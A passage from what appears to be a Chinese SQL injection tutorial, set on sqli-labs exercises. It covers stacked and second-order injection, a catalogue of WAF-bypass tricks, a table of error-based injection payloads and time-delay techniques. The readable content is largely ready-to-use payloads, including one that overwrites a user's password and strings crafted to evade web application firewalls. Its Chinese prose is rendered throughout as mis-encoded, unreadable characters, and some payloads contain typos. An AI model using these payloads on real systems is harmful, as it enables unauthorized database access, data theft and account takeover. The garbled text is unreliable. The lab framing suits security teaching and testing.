injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ä»¥sqli-labsç¬¬38å…³ä¸ºä¾‹</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_38.png" alt=""></p><p>æ‰§è¡Œ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;update users set password=&#x27;</span><span class="number">123456</span><span class="string">&#x27; where id=1; --+ </span></span><br></pre></td></tr></table></figure><p>æ„æ€å°±æ˜¯å†æ›´æ–°id=1çš„ç”¨æˆ·å¯†ç ä¸º123456ã€‚å¦‚ä¸‹æˆåŠŸæ‰§è¡Œäº†æ›´æ–°å¯†ç çš„è¯­å¥</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_39.png" alt=""></p><p><strong>å †å æŸ¥è¯¢çš„å±€é™æ€§</strong></p><p>å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶äº†æƒé™ä¸è¶³ä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæ”»å‡»è€…æ— æ³•ä¿®æ”¹æ•°æ®æˆ–è€…è°ƒç”¨ä¸€äº›ç¨‹åºã€‚è™½ç„¶æˆ‘ä»¬å‰é¢æåˆ°äº†å †å æŸ¥è¯¢å¯ä»¥æ‰§è¡Œä»»æ„çš„sqlè¯­å¥ï¼Œä½†æ˜¯è¿™ç§æ³¨å…¥æ–¹å¼å¹¶ä¸æ˜¯ååˆ†çš„å®Œç¾çš„ã€‚åœ¨æˆ‘ä»¬çš„webç³»ç»Ÿä¸­ï¼Œå› ä¸ºä»£ç é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œå› æ­¤ï¼Œå †å æ³¨å…¥ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–è€…ç»“æœåªèƒ½è¢«å¿½ç•¥ï¼Œæˆ‘ä»¬åœ¨å‰ç«¯ç•Œé¢æ˜¯æ— æ³•çœ‹åˆ°è¿”å›ç»“æœçš„ã€‚å¦‚ä¸Šé¢çš„å®ä¾‹å¦‚æœæˆ‘ä»¬ä¸è¾“å‡ºå¯†ç é‚£æˆ‘ä»¬æ˜¯çœ‹ä¸åˆ°è¿™ä¸ªç»“æœçš„ã€‚å› æ­¤ï¼Œåœ¨è¯»å–æ•°æ®æ—¶ï¼Œæˆ‘ä»¬å»ºè®®ä½¿ç”¨unionï¼ˆè”åˆï¼‰æ³¨å…¥ã€‚åŒæ—¶åœ¨ä½¿ç”¨å †å æ³¨å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯éœ€è¦çŸ¥é“ä¸€äº›æ•°æ®åº“ç›¸å…³ä¿¡æ¯çš„ï¼Œä¾‹å¦‚è¡¨åï¼Œåˆ—åç­‰ä¿¡æ¯</p><h2 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h2><p>äºŒæ¬¡æ³¨å…¥æ¼æ´æ˜¯ä¸€ç§åœ¨Webåº”ç”¨ç¨‹åºä¸­å¹¿æ³›å­˜åœ¨çš„å®‰å…¨æ¼æ´å½¢å¼ã€‚ç›¸å¯¹äºä¸€æ¬¡æ³¨å…¥æ¼æ´è€Œè¨€ï¼ŒäºŒæ¬¡æ³¨å…¥æ¼æ´æ›´éš¾ä»¥è¢«å‘ç°ï¼Œä½†æ˜¯å®ƒå´å…·æœ‰ä¸â€”æ¬¡æ³¨å…¥æ”»å‡»æ¼æ´ç›¸åŒçš„æ”»å‡»å¨åŠ›</p><ul><li>é»‘å®¢é€šè¿‡æ„é€ æ•°æ®çš„å½¢å¼ï¼Œåœ¨æµè§ˆå™¨æˆ–è€…å…¶ä»–è½¯ä»¶ä¸­æäº¤HTTPæ•°æ®æŠ¥æ–‡è¯·æ±‚åˆ°æœåŠ¡ç«¯è¿›è¡Œå¤„ç†ï¼Œæäº¤çš„æ•°æ®æŠ¥æ–‡è¯·æ±‚ä¸­å¯èƒ½åŒ…å«äº†é»‘å®¢æ„é€ çš„SQLè¯­å¥æˆ–è€…å‘½ä»¤ã€‚</li><li>æœåŠ¡ç«¯åº”ç”¨ç¨‹åºä¼šå°†é»‘å®¢æäº¤çš„æ•°æ®ä¿¡æ¯è¿›è¡Œå­˜å‚¨ï¼Œé€šå¸¸æ˜¯ä¿å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œä¿å­˜çš„æ•°æ®ä¿¡æ¯çš„ä¸»è¦ä½œç”¨æ˜¯ä¸ºåº”ç”¨ç¨‹åºæ‰§è¡Œå…¶ä»–åŠŸèƒ½æä¾›åŸå§‹è¾“å…¥æ•°æ®å¹¶å¯¹å®¢æˆ·ç«¯è¯·æ±‚åšå‡ºå“åº”ã€‚</li><li>é»‘å®¢å‘æœåŠ¡ç«¯å‘é€ç¬¬äºŒä¸ªä¸ç¬¬ä¸€æ¬¡ä¸ç›¸åŒçš„è¯·æ±‚æ•°æ®ä¿¡æ¯ã€‚</li><li>æœåŠ¡ç«¯æ¥æ”¶åˆ°é»‘å®¢æäº¤çš„ç¬¬äºŒä¸ªè¯·æ±‚ä¿¡æ¯åï¼Œä¸ºäº†å¤„ç†è¯¥è¯·æ±‚ï¼ŒæœåŠ¡ç«¯ä¼šæŸ¥è¯¢æ•°æ®åº“ä¸­å·²ç»å­˜å‚¨çš„æ•°æ®ä¿¡æ¯å¹¶å¤„ç†ï¼Œä»è€Œå¯¼è‡´é»‘å®¢åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚ä¸­æ„é€ çš„SQLè¯­å¥æˆ–è€…å‘½ä»¤åœ¨æœåŠ¡ç«¯ç¯å¢ƒä¸­æ‰§è¡Œã€‚</li><li>æœåŠ¡ç«¯è¿”å›æ‰§è¡Œçš„å¤„ç†ç»“æœæ•°æ®ä¿¡æ¯ï¼Œé»‘å®¢å¯ä»¥é€šè¿‡è¿”å›çš„ç»“æœæ•°æ®ä¿¡æ¯åˆ¤æ–­äºŒæ¬¡æ³¨å…¥æ¼æ´åˆ©ç”¨æ˜¯å¦æˆåŠŸ</li></ul><p>æ€»ç»“ï¼ŒäºŒæ¬¡æ³¨å…¥å°±æ˜¯ç”±äºå°†æ•°æ®å­˜å‚¨è¿›æ•°æ®åº“ä¸­æ—¶æœªåšå¥½è¿‡æ»¤ï¼Œå…ˆæäº¤æ„é€ å¥½çš„ç‰¹æ®Šå­—ç¬¦è¯·æ±‚å­˜å‚¨è¿›æ•°æ®åº“ï¼Œç„¶åæäº¤ç¬¬äºŒæ¬¡è¯·æ±‚æ—¶ä¸ç¬¬ä¸€æ¬¡æäº¤è¿›æ•°æ®åº“ä¸­çš„å­—ç¬¦å‘ç”Ÿäº†ä½œç”¨ï¼Œå½¢æˆäº†ä¸€æ¡æ–°çš„sqlè¯­å¥å¯¼è‡´è¢«æ‰§è¡Œã€‚ä»¥sqli-labsç¬¬24å…³ä¸ºä¾‹</p><p><strong>å¦‚ä¸‹ç‚¹å‡»æ³¨å†Œç”¨æˆ·</strong></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_40.png" alt=""></p><p>è¿™é‡Œæ³¨å†Œç”¨æˆ·åä¸ºadminâ€™#ï¼Œå¯†ç ä¸º123456</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_41.png" alt=""></p><p>æ­¤æ—¶æˆ‘ä»¬æŸ¥çœ‹æ•°æ®åº“ï¼Œæ³¨å†Œçš„ç”¨æˆ·å·²ç»å­˜å‚¨è¿›å»äº†ï¼Œå¹¶ä¸”adminçš„å¯†ç æ˜¯123456</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_42.png" alt=""></p><p><strong>å¯¹æ³¨å†Œçš„è´¦å·è¿›è¡Œç™»å½•ç„¶åä¿®æ”¹å¯†ç ä¸º654321</strong></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_43.png" alt=""></p><p>æ­¤æ—¶æç¤ºå¯†ç å·²ç»æˆåŠŸä¿®æ”¹äº†</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_44.png" alt=""></p><p>æ­¤æ—¶æˆ‘ä»¬å‘ç°åå€’æ˜¯adminçš„å¯†ç è¢«ä¿®æ”¹æˆäº†654321ï¼Œè€Œæˆ‘ä»¬æ³¨å†Œçš„ç”¨æˆ·adminâ€™#çš„å¯†ç å¹¶æ²¡æœ‰è¢«ä¿®æ”¹</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_45.png" alt=""></p><p><strong>æ¼æ´åŸå› </strong></p><ul><li><p>åœ¨è¿›è¡Œç”¨æˆ·æ³¨å†Œçš„å…è®¸å­˜åœ¨â€™å’Œ#è¿™ç§ç‰¹æ®Šå­—ç¬¦</p></li><li><p>åœ¨ä¿®æ”¹å¯†ç é¡µé¢çš„æºç ä¸­ï¼Œå‘ç°è¿™é‡Œå¾ˆæ˜æ˜¾å­˜åœ¨æ³¨å…¥æ¼æ´</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬ç™»å½•è´¦å·adminâ€™#å¹¶ä¿®æ”¹å¯†ç æ—¶ï¼Œè¿™æ¡sqlè¯­å¥å°±å˜æˆäº†å¦‚ä¸‹è¿™ä¸ªæ ·å­ï¼Œ#æŠŠåé¢çš„ä»£ç éƒ½æ³¨é‡Šæ‰äº†ï¼Œæ‰€ä»¥ä¿®æ”¹äº†ç”¨æˆ·adminçš„å¯†ç ä¸º654321</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure><h1 id="WAFç»•è¿‡"><a href="#WAFç»•è¿‡" class="headerlink" title="WAFç»•è¿‡"></a>WAFç»•è¿‡</h1><p><strong>WAFæ‹¦æˆªåŸç†ï¼šWAFä»è§„åˆ™åº“ä¸­åŒ¹é…æ•æ„Ÿå­—ç¬¦è¿›è¡Œæ‹¦æˆª</strong></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_46.png" alt=""></p><h2 id="æ›´æ”¹ä¼ å‚æ–¹å¼ç»•è¿‡"><a href="#æ›´æ”¹ä¼ å‚æ–¹å¼ç»•è¿‡" class="headerlink" title="æ›´æ”¹ä¼ å‚æ–¹å¼ç»•è¿‡"></a>æ›´æ”¹ä¼ å‚æ–¹å¼ç»•è¿‡</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿‡æ»¤<span class="keyword">get</span>æˆ‘ä»¬å°±æ”¹ä¸ºpostæäº¤</span><br></pre></td></tr></table></figure><h2 id="å…³é”®è¯å¤§å°å†™ç»•è¿‡"><a href="#å…³é”®è¯å¤§å°å†™ç»•è¿‡" class="headerlink" title="å…³é”®è¯å¤§å°å†™ç»•è¿‡"></a>å…³é”®è¯å¤§å°å†™ç»•è¿‡</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æœ‰çš„WAFå› ä¸ºè§„åˆ™è®¾è®¡çš„é—®é¢˜ï¼ŒåªåŒ¹é…çº¯å¤§å†™æˆ–çº¯å°å†™çš„å­—ç¬¦ï¼Œå¯¹å­—ç¬¦å¤§å°å†™æ··å†™ç›´æ¥æ— è§†ï¼Œè¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥è¿›è¡Œç»•è¿‡</span><br><span class="line"></span><br><span class="line">ä¸¾ä¾‹ï¼š <span class="keyword">union</span> <span class="keyword">select</span> <span class="comment">---&gt; unIOn SeLEcT</span></span><br></pre></td></tr></table></figure><h2 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">é’ˆå¯¹WAFè¿‡æ»¤çš„å­—ç¬¦ç¼–ç ï¼Œå¦‚ä½¿ç”¨URLç¼–ç ï¼ŒUnicodeç¼–ç ï¼Œåå…­è¿›åˆ¶ç¼–ç ï¼ŒHexç¼–ç ç­‰.</span><br><span class="line">URLç¼–ç ï¼š</span><br><span class="line">    ç™¾åˆ†å·ç¼–ç ï¼ˆ<span class="keyword">Percent</span> Encodingï¼‰ï¼šä»¥<span class="operator">%</span>å¼€å¤´çš„ä¸¤ä½åå…­è¿›åˆ¶æ•°å€¼ï¼Œç”¨äºè¡¨ç¤ºASCIIå­—ç¬¦ã€‚</span><br><span class="line">        åŠ å·ï¼ˆ<span class="operator">+</span>ï¼‰ï¼šç”¨äºè¡¨ç¤ºç©ºæ ¼å­—ç¬¦ã€‚</span><br><span class="line">    Unicodeç¼–ç ï¼š</span><br><span class="line">        è½¬ä¹‰åºåˆ—ï¼ˆ<span class="keyword">Escape</span> Sequenceï¼‰ï¼šä»¥\uå¼€å¤´çš„å››ä½åå…­è¿›åˆ¶æ•°å€¼ï¼Œç”¨äºè¡¨ç¤ºUnicodeå­—ç¬¦ã€‚</span><br><span class="line">        åå…­è¿›åˆ¶ç¼–ç ï¼š</span><br><span class="line">        <span class="number">0</span>xæˆ–è€…\xï¼šä»¥æ­¤ä¸ºå‰ç¼€çš„ä¸¤ä½åå…­è¿›åˆ¶æ•°å€¼ï¼Œç”¨äºè¡¨ç¤ºå­—ç¬¦çš„åå…­è¿›åˆ¶å€¼ã€‚</span><br><span class="line">    Hexç¼–ç ï¼š</span><br><span class="line">        <span class="number">0</span>xæˆ–è€…\xï¼šä»¥æ­¤ä¸ºå‰ç¼€çš„ä¸¤ä½åå…­è¿›åˆ¶æ•°å€¼ï¼Œç”¨äºè¡¨ç¤ºå­—ç¬¦çš„åå…­è¿›åˆ¶å€¼ã€‚</span><br><span class="line"></span><br><span class="line">ä¸¾ä¾‹ï¼š<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span># <span class="operator">=</span><span class="keyword">union</span><span class="operator">%</span><span class="number">0</span>aselect <span class="number">1</span>\u002c2,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><h2 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a>åŒå†™ç»•è¿‡</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">éƒ¨åˆ†WAFåªå¯¹å­—ç¬¦ä¸²è¯†åˆ«ä¸€æ¬¡ï¼Œåˆ é™¤æ•æ„Ÿå­—æ®µå¹¶æ‹¼æ¥å‰©ä½™è¯­å¥ï¼Œè¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŒå†™æ¥è¿›è¡Œç»•è¿‡ã€‚</span><br><span class="line"></span><br><span class="line">ä¸¾ä¾‹ï¼šUNIunionON ï¼ŒSELselectECT anandd</span><br></pre></td></tr></table></figure><h2 id="æ¢è¡Œ-N-ç»•è¿‡"><a href="#æ¢è¡Œ-N-ç»•è¿‡" class="headerlink" title="æ¢è¡Œ(\N)ç»•è¿‡"></a>æ¢è¡Œ(\N)ç»•è¿‡</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¸¾ä¾‹ï¼š<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> username <span class="operator">=</span> \N <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>() <span class="keyword">from</span> admin</span><br></pre></td></tr></table></figure><h2 id="æ³¨é‡Šç¬¦å†…è”æ³¨é‡Šç»•è¿‡ï¼š"><a href="#æ³¨é‡Šç¬¦å†…è”æ³¨é‡Šç»•è¿‡ï¼š" class="headerlink" title="æ³¨é‡Šç¬¦å†…è”æ³¨é‡Šç»•è¿‡ï¼š"></a>æ³¨é‡Šç¬¦å†…è”æ³¨é‡Šç»•è¿‡ï¼š</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å†…è”æ³¨é‡Š<span class="comment">/**/</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">=</span><span class="comment">/*!union*/</span> <span class="keyword">select</span>    <span class="operator">!</span>åçš„ä¼šæ‰§è¡Œ</span><br><span class="line"></span><br><span class="line">æ³¨é‡Šç¬¦é‡Œæ„Ÿå¹å·åé¢çš„å†…å®¹ä¼šè¢«mysqlæ‰§è¡Œã€‚</span><br></pre></td></tr></table></figure><h2 id="åŒä¹‰è¯æ›¿æ¢"><a href="#åŒä¹‰è¯æ›¿æ¢" class="headerlink" title="åŒä¹‰è¯æ›¿æ¢"></a>åŒä¹‰è¯æ›¿æ¢</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span><span class="operator">=</span><span class="operator">&amp;&amp;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">or</span><span class="operator">=</span><span class="operator">||</span></span><br><span class="line"></span><br><span class="line"><span class="operator">=</span>(ç­‰äºå·)<span class="operator">=</span><span class="operator">&lt;</span>ã€<span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line">ç©ºæ ¼<span class="operator">=</span><span class="operator">%</span><span class="number">09</span>,<span class="operator">%</span><span class="number">0</span>a,<span class="operator">%</span><span class="number">0</span>b,<span class="operator">%</span><span class="number">0</span>c,<span class="operator">%</span><span class="number">0</span>d,<span class="operator">%</span><span class="number">20</span>,<span class="operator">%</span>a0ç­‰</span><br><span class="line"></span><br><span class="line">æ³¨ï¼š<span class="operator">%</span><span class="number">0</span>aæ˜¯æ¢è¡Œä¹Ÿå¯ä»¥æ›¿ä»£ç©ºæ ¼</span><br></pre></td></tr></table></figure><h2 id="HTTPå‚æ•°æ±¡æŸ“"><a href="#HTTPå‚æ•°æ±¡æŸ“" class="headerlink" title="HTTPå‚æ•°æ±¡æŸ“"></a>HTTPå‚æ•°æ±¡æŸ“</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å¯¹ç›®æ ‡å‘é€å¤šä¸ªå‚æ•°ï¼Œå¦‚æœç›®æ ‡æ²¡æœ‰å¤šå‚æ•°è¿›è¡Œå¤šæ¬¡è¿‡æ»¤ï¼Œé‚£ä¹ˆWAFå¯¹å¤šä¸ªå‚æ•°åªä¼šè¯†åˆ«å…¶ä¸­çš„ä¸€ä¸ªã€‚</span><br><span class="line"></span><br><span class="line">ä¸¾ä¾‹ï¼š?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">2</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">3</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="comment">/**&amp;id=-1%20union%20select%201,2,3%23*/</span></span><br></pre></td></tr></table></figure><h2 id="ä¸¾ä¾‹"><a href="#ä¸¾ä¾‹" class="headerlink" title="ä¸¾ä¾‹"></a><strong>ä¸¾ä¾‹</strong></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>ç»•è¿‡ï¼š<span class="keyword">order</span><span class="operator">%</span><span class="number">20</span><span class="comment">/*//--/*/</span> <span class="keyword">by</span>     V4<span class="number">.0</span></span><br><span class="line">è”åˆç»•è¿‡ï¼š<span class="keyword">union</span> <span class="comment">/*!--+/*%0aselect/*!1,2,3*/</span> <span class="comment">--+</span></span><br><span class="line"><span class="keyword">from</span>ç»•è¿‡ï¼š <span class="comment">/*!06447%23%0afrom*/</span></span><br></pre></td></tr></table></figure><h1 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h1><h2 id="å‡½æ•°æ›¿æ¢"><a href="#å‡½æ•°æ›¿æ¢" class="headerlink" title="å‡½æ•°æ›¿æ¢"></a>å‡½æ•°æ›¿æ¢</h2><h3 id="æ—¶é—´ç›²æ³¨å‡½æ•°æ›¿æ¢"><a href="#æ—¶é—´ç›²æ³¨å‡½æ•°æ›¿æ¢" class="headerlink" title="æ—¶é—´ç›²æ³¨å‡½æ•°æ›¿æ¢"></a>æ—¶é—´ç›²æ³¨å‡½æ•°æ›¿æ¢</h3><p>æ—¶é—´ç›²æ³¨ä¸­<code>sleep()</code>å‡½æ•°å¯è¢«<code>benchmark()</code>å‡½æ•°æ›¿æ¢</p><p><code>benchmark(count,expr)</code> å‡½æ•°é‡å¤<code>count</code>æ¬¡è¡¨è¾¾å¼<code>expr</code></p><p><strong>ä¾‹å¦‚</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">benchmark(<span class="number">100000</span>,md5(<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h3 id="æŠ¥é”™æ³¨å…¥å‡½æ•°æ›¿æ¢"><a href="#æŠ¥é”™æ³¨å…¥å‡½æ•°æ›¿æ¢" class="headerlink" title="æŠ¥é”™æ³¨å…¥å‡½æ•°æ›¿æ¢"></a>æŠ¥é”™æ³¨å…¥å‡½æ•°æ›¿æ¢</h3><p>æŠ¥é”™æ³¨å…¥æ–¹æ³•</p><div class="table-container"><table><thead><tr><th>åºå·</th><th>å‡½æ•°</th><th>Payload</th></tr></thead><tbody><tr><td>1</td><td>floor()</td><td>select <em> from test where id =1 and (select 1 from (select count(</em>),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</td></tr><tr><td>2</td><td>extractvalue()</td><td>select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</td></tr><tr><td>3</td><td>updatexml()</td><td>select * from test where id=1 and (updataxml(1,concat(0x7e,(select user()),0x7e),1))</td></tr><tr><td>4</td><td>geometrycollection()</td><td>select <em> from test where id=1 and geometrycollection((select </em> from(select * from(select user())a)b))</td></tr><tr><td>5</td><td>multipoint()</td><td>select <em> from test wher id=1 and multipoint((select </em> from(select * from(select user())a)b))</td></tr><tr><td>6</td><td>polygon()</td><td>select <em> from test where id=1 and polygon((select </em> from(select * from(select user())a)b))</td></tr><tr><td>7</td><td>multipolygon()</td><td>select <em> from test where id=1 and multipolygon((select </em> from(select * from(select user())a)b))</td></tr><tr><td>8</td><td>linestring()</td><td>select <em> from test where id=1 and linestring((select </em> from(select * from(select user())a)b))</td></tr><tr><td>9</td><td>multilinestring()</td><td>select <em> from test where id=1 and multilinestring((select </em> from(select * from(select user())a)b))</td></tr><tr><td>10</td><td>exp()</td><td>select <em> from test where id=1 and exp(~(select </em>  from(select user())a))</td></tr></tbody></table></div><h2 id="ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥"><a href="#ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥" class="headerlink" title="ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥"></a>ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥</h2><p><strong>åˆ©ç”¨æ•°æ®åº“çš„ç¬›å¡å°”ç§¯æ“ä½œå¸¦æ¥å¤§é‡è®¡ç®—äº§ç”Ÿæ—¶é—´å»¶é•¿</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>,g1;</span><br></pre></td></tr></table></figure><p><strong>table1</strong></p><div class="table-container"><table><thead><tr><th>id</th><th>name</th></tr></thead><tbody><tr><td>1</td><td>aaa</td></tr><tr><td>2</td><td>bbb</td></tr></tbody></table></div><p><strong>table2</strong></p><div class="table-container"><table><thead><tr><th>tid</th><th>gname</th><th>gc</th></tr></thead><tbody><tr><td>1</td><td>ccc</td><td>ccc111</td></tr><tr><td>2</td><td>ddd</td><td>ddd222</td></tr><tr><td>3</td><td>eee</td><td>eee333</td></tr></tbody></table></div><p><strong>ç¬›å¡å°”ç§¯è¿ç®—ç»“æœ</strong></p><div class="table-container"><table><thead><tr><th>id</th><th>name</th><th>tid</th><th>gname</th><th>gc</th></tr></thead><tbody><tr><td>1</td><td>aaa</td><td>1</td><td>ccc</td><td>ccc111</td></tr><tr><td>2</td><td>bbb</td><td>1</td><td>ccc</td><td>ccc111</td></tr><tr><td>1</td><td>aaa</td><td>2</td><td>ddd</td><td>ddd222</td></tr><tr><td>2</td><td>bbb</td><td>2</td><td>ddd</td><td>ddd222</td></tr><tr><td>1</td><td>aaa</td><td>3</td><td>eee</td><td>eee333</td></tr><tr><td>2</td><td>bbb</td><td>3</td><td>eee</td><td>eee333</td></tr></tbody></table></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns A,information_schema.tables B,information_schema.tables C);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>information_schema</code>çš„<code>columnsã€tables</code>è¡¨è¿›è¡Œç¬›å¡å°”ç§¯è¿ç®—ï¼Œè¿™é‡Œåˆå°†ç»“æœä¸<code>tables</code>è¡¨è¿›è¡Œäº†ä¸€æ¬¡ç¬›å¡å°”ç§¯</p><p>å¯¹äºç½‘ç«™ä¸æ•°æ®åº“é•¿è¿æ¥çš„æƒ…å†µï¼Œè¿˜å¯ä»¥ä½¿ç”¨<code>get_lock</code>å‡½æ•°å¯¹æŸå˜é‡è¿›è¡Œé”å®šï¼Œå½“å…¶ä»–è¿æ¥æ¥è®¿é—®å˜é‡æ—¶ï¼Œè®¿é—®ä¼šæ ¹æ®<code>get_lock</code>ç¬¬äºŒä¸ªå‚æ•°æ‰€è®¾å®šçš„æ—¶é—´è¿›è¡Œå»¶è¿Ÿè¿”å›</p><p>æ‰§è¡Œä»¥ä¸‹è¯­å¥ï¼š<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> get_lock(<span class="string">&#x27;SpongeBob&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> æ‰§è¡Œç»“æœ</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> get_lock(<span class="string">&#x27;SpongeBob&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="operator">|</span> get_lock(<span class="string">&#x27;SpongeBob&#x27;</span>,<span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="operator">|</span>                   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> 